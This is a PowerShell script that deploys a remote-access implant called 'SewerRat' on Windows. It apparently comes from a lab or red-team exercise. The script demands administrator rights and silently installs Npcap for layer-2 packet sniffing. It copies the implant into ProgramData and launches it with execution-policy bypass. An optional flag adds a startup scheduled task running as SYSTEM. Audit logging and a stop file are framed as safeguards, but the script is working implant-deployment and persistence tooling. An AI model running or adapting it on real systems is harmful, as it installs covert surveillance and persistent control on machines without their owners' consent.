# Enable verbose logging for this lab deployment.
param(
    [switch]$Persist
)

# ============================================================================
# SewerRat PowerShell Deployment Script
# REQUIRES: Administrator Privileges
# ============================================================================

# Elevate privileges if not running as Admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "[-] This script requires Administrator privileges. Please run as Administrator."
    exit
}

$ScriptDir = $PSScriptRoot
if ([string]::IsNullOrEmpty($ScriptDir)) { $ScriptDir = "." }

$LocalImplant = Join-Path $ScriptDir "SewerRat.exe"
$LabRoot = "C:\ProgramData\SewerRatLab"
$LogDir = Join-Path $LabRoot "logs"
$DestPath = Join-Path $LabRoot "SewerRat.exe"
$LocalNpcap = Join-Path $ScriptDir "npcap-1.87.exe"
$ServiceName = "SewerRatLabDemo"
$StopFile = Join-Path $LabRoot "STOP"

New-Item -Path $LabRoot -ItemType Directory -Force | Out-Null
New-Item -Path $LogDir -ItemType Directory -Force | Out-Null

$TranscriptPath = Join-Path $LogDir ("deploy-" + (Get-Date -Format "yyyyMMdd-HHmmss") + ".log")
Start-Transcript -Path $TranscriptPath -Append | Out-Null

Write-Host "[AUDIT] Lab root: $LabRoot"
Write-Host "[AUDIT] Deployment transcript: $TranscriptPath"
Write-Host "[AUDIT] Local stop file (create this to stop future command execution): $StopFile"

Write-Host "[*] Checking for Npcap installer at $LocalNpcap..."
if (-Not (Test-Path $LocalNpcap)) {
    Write-Host "[-] local Npcap installer not found! Make sure to transfer it."
    Stop-Transcript | Out-Null
    exit
}

Write-Host "[*] Installing Npcap silently (Required for Layer 2 Packet Sniffing)..."
try {
    $process = Start-Process -FilePath $LocalNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
    if ($process.ExitCode -eq 0) {
        Write-Host "[+] Npcap installed successfully."
    } else {
        Write-Host "[-] Npcap installation may have encountered an issue (Exit Code: $($process.ExitCode)). Continuing anyway..."
    }
} catch {
    Write-Host "[-] Failed to execute Npcap installer: $_"
}

Write-Host "[*] Checking for SewerRat implant at $LocalImplant..."
if (-Not (Test-Path $LocalImplant)) {
    Write-Host "[-] local SewerRat implant not found! Make sure to transfer it."
    Stop-Transcript | Out-Null
    exit
}

Write-Host "[*] Persisting SewerRat implant to $DestPath..."
try {
    Copy-Item -Path $LocalImplant -Destination $DestPath -Force
    Write-Host "[+] Implant copied successfully: $DestPath"
} catch {
    Write-Host "[-] Failed to copy implant: $_"
    Stop-Transcript | Out-Null
    exit
}

Write-Host "[*] Starting the implant process explicitly in demo mode..."
try {
    $StartArgs = @(
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-Command",
        "`$env:SEWERRAT_DEMO_MODE='1'; `$env:SEWERRAT_LAB_DIR='$LabRoot'; `$env:SEWERRAT_AUDIT_DIR='$LogDir'; `$env:SEWERRAT_STOP_FILE='$StopFile'; & '$DestPath'"
    )
    Start-Process -FilePath "powershell.exe" -ArgumentList $StartArgs
    Write-Host "[+] Lab implant launched with visible audit settings."
} catch {
    Write-Host "[-] Failed to start implant directly: $_"
}

if ($Persist) {
    Write-Host "[*] Creating visible persistence via Scheduled Task '$ServiceName'..."
    try {
        if (Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue) {
            Write-Host "[!] Scheduled task already exists. Cleaning up old task..."
            Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
            Start-Sleep -Seconds 2
        }

        $TaskCommand = "`$env:SEWERRAT_DEMO_MODE='1'; `$env:SEWERRAT_LAB_DIR='$LabRoot'; `$env:SEWERRAT_AUDIT_DIR='$LogDir'; `$env:SEWERRAT_STOP_FILE='$StopFile'; & '$DestPath'"
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command $TaskCommand"
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Hours 1)

        Register-ScheduledTask -TaskName $ServiceName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "SewerRat lab demo process with explicit audit logging" | Out-Null
        Write-Host "[+] Scheduled Task created successfully."
    } catch {
        Write-Host "[-] Failed to create Scheduled Task: $_"
        Stop-Transcript | Out-Null
        exit
    }
} else {
    Write-Host "[*] Persistence disabled by default for this contained demo. Re-run with -Persist only if you need it."
}

Write-Host "[*] Deployment complete!"
Stop-Transcript | Out-Null
